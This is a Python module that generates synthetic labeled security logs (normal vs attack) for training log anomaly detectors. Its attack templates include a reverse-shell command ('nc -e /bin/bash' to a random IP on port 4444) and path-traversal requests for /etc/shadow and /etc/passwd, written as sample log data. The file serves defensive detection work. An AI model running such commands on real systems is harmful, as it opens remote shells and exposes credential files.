"""Synthetic security log data generation.

Produces labeled CSV logs with 'line' and 'label' columns, following the
r87-e/ais-grupp-logganomali data format. Attack patterns cover SSH brute-force,
privilege escalation, scanner traffic, and web exploitation attempts.
"""

from __future__ import annotations

import csv
import random
from pathlib import Path

_NORMAL_TEMPLATES = [
    "sshd[{pid}]: Accepted password for {user} from {ip} port {port} ssh2",
    "sshd[{pid}]: Accepted publickey for {user} from {ip} port {port} ssh2",
    "sshd[{pid}]: pam_unix(sshd:session): session opened for user {user} by (uid=0)",
    "sudo[{pid}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/apt upgrade",
    "sudo[{pid}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/systemctl status",
    "systemd[1]: Started {service}.service",
    "systemd[1]: Reached target Multi-User System",
    "cron[{pid}]: ({user}) CMD (/usr/local/bin/backup.sh)",
    "kernel: [UFW ALLOW] IN=eth0 OUT= SRC={ip} DST=10.0.0.1 PROTO=TCP SPT={sport} DPT=22",
    "{ip} - - [01/Jan/2024:12:00:00 +0000] \"GET /index.html HTTP/1.1\" 200 1234",
    "{ip} - - [01/Jan/2024:12:00:00 +0000] \"GET /api/health HTTP/1.1\" 200 42",
    "kernel: audit: type=1100 auid={uid} uid=0 gid=0 ses=1",
    "sshd[{pid}]: Disconnected from {ip} port {port} [preauth]",
    "ntpd[{pid}]: synchronized to {ip}, stratum 2",
    "rsyslogd: [origin software=\"rsyslogd\"] start",
]

_ATTACK_TEMPLATES = [
    "sshd[{pid}]: Failed password for root from {ip} port {port} ssh2",
    "sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2",
    "sshd[{pid}]: Failed password for invalid user admin from {ip} port {port} ssh2",
    "sshd[{pid}]: Invalid user guest from {ip} port {port}",
    "sshd[{pid}]: error: maximum authentication attempts exceeded for root from {ip}",
    "sshd[{pid}]: Connection closed by invalid user {user} {ip} port {port} [preauth]",
    "sudo[{pid}]: {user} : command not allowed ; TTY=pts/0 ; COMMAND=/bin/bash",
    "sudo[{pid}]: {user} : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/nc -e /bin/bash {ip} 4444",
    "sudo[{pid}]: {user} : 3 incorrect password attempts ; COMMAND=/bin/su",
    "kernel: [UFW BLOCK] IN=eth0 OUT= SRC={ip} DST=10.0.0.1 PROTO=TCP DPT={port}",
    "kernel: audit: type=1400 AVC avc:  denied  {{ execve }} for  pid={pid} comm=\"bash\"",
    "{ip} - - [01/Jan/2024:03:14:07 +0000] \"GET /etc/passwd HTTP/1.1\" 404 0",
    "{ip} - - [01/Jan/2024:03:14:07 +0000] \"GET /../../../etc/shadow HTTP/1.1\" 400 0",
    "{ip} - - [01/Jan/2024:03:14:07 +0000] \"POST /wp-admin/admin-ajax.php HTTP/1.1\" 200 42",
]


def _rand_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _rand_vals() -> dict:
    users = ["alice", "bob", "charlie", "dave", "ubuntu", "user"]
    services = ["nginx", "sshd", "cron", "systemd-logind", "auditd", "rsyslog"]
    return {
        "pid": random.randint(1000, 60000),
        "user": random.choice(users),
        "ip": _rand_ip(),
        "port": random.randint(1024, 65535),
        "sport": random.randint(30000, 65535),
        "service": random.choice(services),
        "uid": random.randint(1000, 9999),
    }


def generate_logs(n_normal: int = 800, n_attack: int = 200, seed: int = 42) -> list[dict]:
    """Generate a labeled synthetic log dataset."""
    random.seed(seed)
    records: list[dict] = []
    for _ in range(n_normal):
        records.append({"line": random.choice(_NORMAL_TEMPLATES).format(**_rand_vals()), "label": "normal"})
    for _ in range(n_attack):
        records.append({"line": random.choice(_ATTACK_TEMPLATES).format(**_rand_vals()), "label": "attack"})
    random.shuffle(records)
    return records


def save_csv(records: list[dict], path: Path) -> None:
    """Save log records to CSV with 'line' and 'label' columns."""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["line", "label"])
        writer.writeheader()
        writer.writerows(records)


def load_csv(path: Path) -> list[dict]:
    """Load log CSV. Requires 'line' column; 'label' is optional."""
    with open(path, newline="", encoding="utf-8") as f:
        return list(csv.DictReader(f))
